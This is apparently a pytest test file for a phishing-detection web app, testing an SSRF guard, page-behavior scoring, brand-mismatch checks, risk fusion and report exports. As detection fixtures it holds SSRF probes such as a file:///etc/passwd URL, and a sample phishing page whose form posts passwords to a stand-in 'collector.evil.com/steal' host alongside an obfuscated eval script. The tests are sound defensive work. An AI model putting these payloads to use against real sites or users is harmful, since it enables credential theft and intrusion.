"""
NEURAL-X Test Suite — v4 additions
Covers: Visual Phishing Detection, Behavioral Analysis, Multi-Signal Risk
Fusion + Prevention, CSV export fix, PDF export fix, SSRF guard.

Run: pytest tests/test_v4_features.py -v
"""

import json
import pytest
from app import create_app, db
from app.models.scan_history import ScanHistory


@pytest.fixture
def app():
    app = create_app('testing')
    with app.app_context():
        db.create_all()
        yield app
        db.drop_all()


@pytest.fixture
def client(app):
    return app.test_client()


# ── SSRF Guard ────────────────────────────────────────────────────────────
class TestSSRFGuard:
    def test_blocks_private_ip(self):
        from app.utils.ssrf_guard import validate_public_url
        ok, _ = validate_public_url('http://192.168.1.1/')
        assert not ok

    def test_blocks_loopback(self):
        from app.utils.ssrf_guard import validate_public_url
        ok, _ = validate_public_url('http://127.0.0.1/')
        assert not ok

    def test_blocks_bad_scheme(self):
        from app.utils.ssrf_guard import validate_public_url
        ok, _ = validate_public_url('file:///etc/passwd')
        assert not ok

    def test_blocks_unusual_port(self):
        from app.utils.ssrf_guard import validate_public_url
        ok, _ = validate_public_url('http://example.com:22/')
        assert not ok

    def test_allows_normal_public_url(self):
        from app.utils.ssrf_guard import validate_public_url
        ok, _ = validate_public_url('https://example.com/')
        assert ok


# ── Behavioral Analyzer (pure scoring logic) ─────────────────────────────
class TestBehaviorScoring:
    def test_detects_redirects_forms_scripts_iframes_downloads(self):
        from app.services.behavior_analyzer import _score_page
        html = '''
        <html><head><meta http-equiv="refresh" content="0;url=http://evil.com"></head>
        <body>
        <form action="http://collector.evil.com/steal" method="post">
        <input type="password" name="pw">
        </form>
        <iframe src="http://track.evil.com"></iframe>
        <script>eval(unescape('%61'))</script>
        <a href="malware.exe">Download</a>
        </body></html>
        '''
        score, indicators = _score_page(html, 3, 'http://good.com', 'http://good.com')
        assert score > 60
        assert any('redirect' in i.lower() for i in indicators)
        assert any('password' in i.lower() for i in indicators)
        assert any('external domain' in i.lower() for i in indicators)
        assert any('script' in i.lower() for i in indicators)
        assert any('iframe' in i.lower() for i in indicators)
        assert any('executable' in i.lower() for i in indicators)

    def test_clean_page_scores_low(self):
        from app.services.behavior_analyzer import _score_page
        html = '<html><head><title>Blog</title></head><body><p>Hello world</p></body></html>'
        score, indicators = _score_page(html, 0, 'http://good.com', 'http://good.com')
        assert score < 10

    def test_unavailable_never_raises_on_blocked_url(self):
        from app.services.behavior_analyzer import analyze_behavior
        result = analyze_behavior('http://192.168.1.1/')
        assert result['available'] is False
        assert result['behavior_score'] is None
        assert result['unavailable_reason']


# ── Visual Analyzer ───────────────────────────────────────────────────────
class TestVisualAnalyzer:
    def test_brand_domain_mismatch_detection(self):
        from app.services import visual_analyzer as va
        title = va._extract_title(
            '<html><head><title>PayPal - Verify Your Account</title></head></html>'
        )
        assert 'PayPal' in title
        assert va._domain_matches_brand('paypal-secure-login.tk', 'paypal') is True
        assert va._domain_matches_brand('paypal.com', 'paypal') is True
        assert va._domain_matches_brand('totally-unrelated-site.com', 'paypal') is False

    def test_unavailable_never_raises_on_blocked_url(self):
        from app.services.visual_analyzer import analyze_visual
        result = analyze_visual('http://192.168.1.1/', '192.168.1.1')
        assert result['available'] is False
        assert result['visual_score'] is None
        assert result['unavailable_reason']


# ── Risk Fusion Engine ────────────────────────────────────────────────────
class TestRiskFusion:
    def test_all_signals_available_high_risk(self):
        from app.services.risk_fusion import compute_final_risk
        r = compute_final_risk(
            78, 82,
            {'available': True, 'visual_score': 94, 'indicators': ['Login page detected']},
            {'available': True, 'behavior_score': 89, 'indicators': ['Multiple redirects detected']},
        )
        assert r['final_score'] is not None
        assert r['risk_level'] == 'CRITICAL'
        assert r['prevention_action'] == 'block'
        assert 'Login page detected' in r['reasons']

    def test_missing_signal_redistributes_weight(self):
        from app.services.risk_fusion import compute_final_risk
        r = compute_final_risk(10, 5, {'available': False}, {'available': True, 'behavior_score': 5, 'indicators': []})
        assert r['signals']['visual']['available'] is False
        assert r['final_score'] is not None
        assert r['risk_level'] == 'SAFE'

    def test_all_signals_missing_returns_unknown_not_a_fabricated_score(self):
        from app.services.risk_fusion import compute_final_risk
        r = compute_final_risk(None, None, {'available': False}, {'available': False})
        assert r['final_score'] is None
        assert r['risk_level'] == 'UNKNOWN'

    def test_risk_levels_match_spec_thresholds(self):
        from app.services.risk_fusion import compute_final_risk
        safe = compute_final_risk(10, 10, {'available': True, 'visual_score': 10, 'indicators': []},
                                  {'available': True, 'behavior_score': 10, 'indicators': []})
        critical = compute_final_risk(95, 95, {'available': True, 'visual_score': 95, 'indicators': []},
                                      {'available': True, 'behavior_score': 95, 'indicators': []})
        assert safe['risk_level'] == 'SAFE'
        assert critical['risk_level'] == 'CRITICAL'


# ── CSV Export (root-cause fix) ───────────────────────────────────────────
class TestCSVExport:
    def test_empty_dataset(self, client):
        r = client.get('/history/export/csv')
        assert r.status_code == 200
        text = r.data.decode('utf-8-sig')
        assert 'Final Risk Score' in text
        assert 'Visual Risk' in text

    def test_full_v4_fields_present_and_escaped(self, app, client):
        with app.app_context():
            s = ScanHistory(
                url='http://evil.com/a,b"c', domain='evil.com',
                threat_score=90, risk_category='Critical Threat', scan_type='url',
                visual_risk=94, behavior_risk=89, domain_risk=82,
                final_risk_score=92, risk_level='CRITICAL', prevention_action='block',
                detection_reasons=json.dumps(['Reason one', 'Reason two']),
            )
            db.session.add(s)
            db.session.commit()

        r = client.get('/history/export/csv')
        text = r.data.decode('utf-8-sig')
        assert 'CRITICAL' in text
        assert 'Reason one; Reason two' in text
        assert '""secure""' not in text  # sanity: our test value doesn't include this
        assert 'a,b""c' in text  # comma+quote correctly CSV-escaped

    def test_large_dataset(self, app, client):
        with app.app_context():
            db.session.bulk_save_objects([
                ScanHistory(url=f'http://s{i}.com', domain=f's{i}.com',
                           threat_score=1, risk_category='Safe', scan_type='url')
                for i in range(2000)
            ])
            db.session.commit()
        r = client.get('/history/export/csv')
        rows = r.data.decode('utf-8-sig').strip().split('\n')
        assert len(rows) == 2001  # header + 2000 rows


# ── PDF Export (root-cause fix: was returning JSON, not a file) ──────────
class TestPDFExport:
    def test_returns_real_pdf_bytes_not_json(self, app, client):
        with app.app_context():
            s = ScanHistory(
                url='http://evil.com/login', domain='evil.com',
                threat_score=90, risk_category='Critical Threat', scan_type='url',
                visual_risk=94, behavior_risk=89, domain_risk=82,
                final_risk_score=92, risk_level='CRITICAL', prevention_action='block',
                detection_reasons=json.dumps(['Reason one']),
            )
            db.session.add(s)
            db.session.commit()
            scan_id = s.id

        r = client.get(f'/history/{scan_id}/export/pdf')
        assert r.status_code == 200
        assert r.headers['Content-Type'] == 'application/pdf'
        assert 'attachment' in r.headers['Content-Disposition']
        assert r.data[:4] == b'%PDF'

    def test_nonexistent_scan_404s(self, client):
        r = client.get('/history/999999/export/pdf')
        assert r.status_code == 404


# ── Full scan pipeline resilience ─────────────────────────────────────────
class TestScanResilience:
    def test_scan_never_crashes_when_all_v4_modules_fail(self, client):
        r = client.post('/scan/url',
                        data={'url': 'http://this-should-not-resolve-xyz123.invalid/'},
                        follow_redirects=True)
        assert r.status_code == 200

    def test_invalid_url_handled_gracefully(self, client):
        r = client.post('/scan/url', data={'url': 'not a url at all'}, follow_redirects=True)
        assert r.status_code == 200

    def test_backward_compat_routes_still_work(self, client):
        for path in ['/', '/scan/url', '/scan/qr', '/history/', '/api/stats', '/api/history']:
            assert client.get(path).status_code == 200

    def test_url_scan_type_not_mislabeled_as_journal(self, client, app):
        """
        Root-cause regression test: journal_analyzer runs as a background
        ENRICHMENT signal on nearly every URL (the classifier defaults to
        'should_run_journal_checks=True' for most sites), but the /scan/url
        route previously used `scan_type='journal' if journal_result else
        'url'` — mislabeling ordinary URL scans as scan_type='journal'
        because journal_result was populated for virtually every scan.
        A plain URL scan must always be saved as scan_type='url'.
        """
        client.post('/scan/url', data={'url': 'https://example.com/'}, follow_redirects=True)
        with app.app_context():
            latest = ScanHistory.query.order_by(ScanHistory.id.desc()).first()
            assert latest is not None
            assert latest.scan_type == 'url'
